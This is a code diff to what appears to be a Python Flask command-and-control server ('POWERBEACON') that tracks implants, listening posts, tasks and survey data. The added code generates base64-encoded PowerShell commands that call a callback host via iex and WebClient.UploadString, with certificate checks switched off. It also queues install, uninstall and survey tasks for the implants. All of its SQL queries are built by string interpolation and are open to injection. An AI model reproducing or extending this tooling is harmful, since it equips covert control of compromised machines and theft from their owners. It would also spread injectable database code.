@@ -3,55 +3,127 @@
 from flask import Flask,render_template,request,redirect,url_for,flash,make_response
 import time
 from base64 import b64encode
+from base64 import b64decode
 import MySQLdb
 
 
-def getCheckIns(connection, UUID, depth):
-    """
-    Retrieves the check-in details for a given UUID from the database.
+class Implant:
+    def __init__(self,UUID,implantkey,notes,c2,filter,consumer):
+        self.name=UUID
+        self.key=implantkey
+        self.notes=notes
+        self.c2=c2
+        self.filter=filter
+        self.consumer=consumer
 
-    Args:
-        connection: The database connection object.
-        UUID (str): The UUID of the implant.
-        depth (int): The number of check-ins to retrieve.
+class callback:
+    def __init__(self, UUID, time, gateway):
+        self.UUID = UUID
+        self.time = time
+        self.gateway = gateway
 
-    Returns:
-        list: A list of dictionaries containing the check-in details.
+class Task:
+    def __init__(self, id, UUID, task, notes, time_complete):
+        self.id = id
+        self.UUID = UUID
+        self.task = task
+        self.notes = notes
+        self.time_complete = time_complete
+
+class Survey:
+    def __init__(self, id, UUID, time_delivered, details, data):
+        self.id = id
+        self.UUID = UUID
+        self.time_delivered = time_delivered
+        self.details = details
+        self.data = data
+
+class ListeningPost:
     """
+    Represents a listening post object.
+
+    Attributes:
+        id (str): The name of the listening post.
+        address (str): The address of the listening post.
+        connections_count (int): The number of connections to the listening post.
+        verify_key (str): The verification key of the listening post.
+        connections (list): A list of UUIDs representing the connections to the listening post.
+    """
+   
+    def __init__(self, name, address, connection):
+        connection.commit()
+        self.id = name
+        self.address = address
+        cur = connection.cursor()
+        getCount = cur.execute(f"SELECT COUNT(*) FROM implants WHERE c2 = '{address}'")
+        getCount = cur.fetchall()
+        self.connections_count = getCount[0][0]
+        getVerifyKey =  cur.execute(f"SELECT verify_key FROM callbackAddresses WHERE address = '{address}'")
+        getVerifyKey = cur.fetchall()
+        self.verify_key = getVerifyKey[0][0]
+        connections = cur.execute(f"SELECT UUID FROM implants WHERE c2 = '{address}'")
+        connections = cur.fetchall()
+        self.validation = buildListeningPostValidation(connection, name)
+        self.connections = []
+        for connection in connections:
+            self.connections.append(connection[0])
+        cur.close()
+
+
+def buildListeningPostValidation(connection,name):
     cur = connection.cursor()
     connection.commit()
-    implants = cur.execute("select * from checkins where UUID='" + UUID + "' order by last_checkin desc limit " + depth)
-    implantDetails = cur.fetchall()
+    cur.execute(f"SELECT verify_key,address FROM callbackAddresses WHERE name = '{name}'")
+    data = cur.fetchall()
+    verify_key = data[0][0]
+    address = data[0][1]
     cur.close()
-    return implantDetails
+    messageblock = f"iex(New-Object Net.Webclient).UploadString('{address}', \"{{ 'name':'{name}', 'key':'{verify_key}', 'event' : 'validate' }}\")"
+    if address[4] == "s":
+        messageblock = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};" + messageblock
+    messageblock = b64encode(messageblock.encode('UTF-16LE')).decode('UTF-8')
+    messageblock = f"powershell -e {messageblock}"
+    return messageblock
+
+    
+def getCallbacks(connection, UUID, depth):
+    cur = connection.cursor()
+    connection.commit()
+    checkInGet = cur.execute(f"select * from checkins where UUID='{UUID}' order by last_checkin desc limit {depth}")
+    checkInFetch = cur.fetchall()
+    callbackList=[]
+    
+    cur.close()
+    for checkIn in checkInFetch:
+        callbacks = callback(checkIn[1], checkIn[3], checkIn[2])
+        callbackList.append(callbacks)
+    return callbackList
 
 def getTasks(connection, UUID, complete):
-    """
-    Retrieve tasks from the database based on the completion status.
-
-    Args:
-        connection: The database connection object.
-        UUID: The UUID of the task.
-        complete: The completion status of the task.
-
-    Returns:
-        A list of task details, including id, UUID, task, notes, and time_complete.
-    """
     cur = connection.cursor()
     connection.commit()
     # Retrieve tasks from the database based on the completion status
-    tasks = cur.execute(f"SELECT id, UUID, task, notes, time_complete FROM tasks WHERE (is_complete={complete}) ORDER BY id DESC")
+    if int(complete) == 0:             #Completed tasks read most recent first
+        tasks = cur.execute(f"SELECT id, UUID, task, notes, time_complete FROM tasks WHERE (is_complete={complete}) ORDER BY id ASC")
+    else:                              #Uncompleted tasks read oldest first
+        tasks = cur.execute(f"SELECT id, UUID, task, notes, time_complete FROM tasks WHERE (is_complete={complete}) ORDER BY id desc")
     taskDetails = cur.fetchall()
+    taskList = []
+    for task in taskDetails:
+        taskList.append(Task(task[0], task[1], task[2], task[3], task[4]))
+    #print(taskList)
     cur.close()
-    return taskDetails
+   
+    return taskList
 
-def getDetails(connection, UUID):
+def getImplant(connection, UUID):
     cur = connection.cursor()
     connection.commit()
-    implant = cur.execute(f"SELECT * FROM implants WHERE UUID='{UUID}'")
-    implantDetails = cur.fetchall()
+    implantQuery = cur.execute(f"SELECT * FROM implants WHERE UUID='{UUID}'")
+    implantQuery = cur.fetchall()
     cur.close()
-    return implantDetails
+    theImplant = Implant(implantQuery[0][0], implantQuery[0][1], implantQuery[0][2], implantQuery[0][3], implantQuery[0][4], implantQuery[0][5])
+    return theImplant
 
 def getImplantList(connection):
     cur = connection.cursor()
@@ -63,17 +135,19 @@ def getImplantList(connection):
 
 def getC2List(connection):
     cur = connection.cursor()
-    c2listget = cur.execute("select * from callbackAddresses")
+    c2list = cur.execute("select * from callbackAddresses")
     c2list = cur.fetchall()    
     cur.close()
     return(c2list)
 
-
 def getSurveyList(connection, UUID):
     connection.commit()
     cur = connection.cursor()
-    surveyData = cur.execute(f"select id, UUID, delivered, details, data from datastore where (uuid = '{UUID}') order by delivered desc limit 30")
-    surveyData = cur.fetchall()
+    surveyQuery = cur.execute(f"select id, UUID, delivered, details, data from datastore where (uuid = '{UUID}') order by delivered desc limit 30")
+    surveyQuery = cur.fetchall()
+    surveyData = []
+    for survey in surveyQuery:
+        surveyData.append(Survey(survey[0], survey[1], survey[2], survey[3], survey[4]))
     cur.close()
     return surveyData
 
@@ -93,10 +167,13 @@ def addImplant(connection, UUID, implantkey, notes, c2, filter, consumer):
     Returns:
     None
     """
-    cur = connection.cursor()
-    cur.execute(f"INSERT INTO implants (UUID, implantkey, notes, c2, filter, consumer) VALUES ('{UUID}', '{implantkey}', '{notes}', '{c2}', '{filter}', '{consumer}')")
-    connection.commit()
-    cur.close()
+    try:
+        cur = connection.cursor()
+        cur.execute(f"INSERT INTO implants (UUID, implantkey, notes, c2, filter, consumer) VALUES ('{UUID}', '{implantkey}', '{notes}', '{c2}', '{filter}', '{consumer}')")
+        connection.commit()
+        cur.close()
+    except Exception as e:
+        raise ValueError('Propbable duplicate UUID or database error')    
     return
 
 def addImplant(connection,UUID,implantkey,notes,c2,filter,consumer):
@@ -144,6 +221,35 @@ def deleteImplant(connection,UUID):
     cur.close()
     return
 
+def deleteListeningPost(connection, name):
+    connection.commit()
+    cur = connection.cursor()
+    cur.execute(f"DELETE FROM callbackAddresses WHERE name = '{name}'")
+    connection.commit()
+    cur.close()
+    return
+
+def addListeningPost(connection, name, address):
+    connection.commit()
+    if not address.startswith("http"):
+        raise ValueError('The address must start with http or https')
+    name = name.replace(" ", "")
+    verify_key = b64encode(str(time.time()).encode()).decode()
+    cur = connection.cursor()
+    callbackNameCheck = cur.execute(f"SELECT COUNT(*) FROM callbackAddresses WHERE name = '{name}'")
+    doesNameExist = cur.fetchall()
+    callbackAddressCheck = cur.execute(f"SELECT COUNT(*) FROM callbackAddresses WHERE address = '{address}'")
+    doesAddressExist = cur.fetchall()
+    if doesNameExist[0][0] > 0:
+        raise ValueError('The listening post name already exists')
+    if doesAddressExist[0][0] > 0:
+        raise ValueError('The listening post address already exists')
+    cur = connection.cursor()
+    cur.execute(f"INSERT INTO callbackAddresses (name, address, verify_key) VALUES ('{name}', '{address}', '{verify_key}')")
+    connection.commit()
+    cur.close()
+    return
+
 def uninstallImplant(connection,UUID):
     uninstallTask=generateInstall(connection,UUID,0)
     uninstallTask=uninstallTask[1]
@@ -160,6 +266,17 @@ def updateSettings(connection,UUID,notes,C2,filter,consumer,interval):
     uninstallReinstall =  uninstall + ";" + install
     addTask(connection,UUID,uninstallReinstall,"POWERBEACON SYSTEM TASK: Update Implant Settings")
     return    
+
+def getListeningPosts(connection):
+    cur = connection.cursor()
+    connection.commit()
+    listeningPostsList = []
+    lplist = getC2List(connection)
+    for lp in lplist:
+        listeningPostsList.append(ListeningPost(lp[0], lp[1], connection))
+    cur.close()
+    return listeningPostsList
+
 
 
 def generateSurvey(connection,UUID,options,notes):
@@ -200,8 +317,19 @@ def generateSurvey(connection,UUID,options,notes):
     
     task = b64encode(task.encode('UTF-16LE')).decode('UTF-8')
     task = encodedtask = "powershell -e " + task
-
+    print(task)
     return(task)
+
+def base64Encode(data):
+    data = b64encode(data.encode('UTF-16LE')).decode('UTF-8')
+    return data
+
+def base64Decode(data):
+    try:
+        data = b64decode(data).decode('UTF-16LE')
+    except Exception as e:
+        data = "Error decoding data"
+    return data
 
 def generateInstall(connection,UUID,interval):
     interval=int(interval)
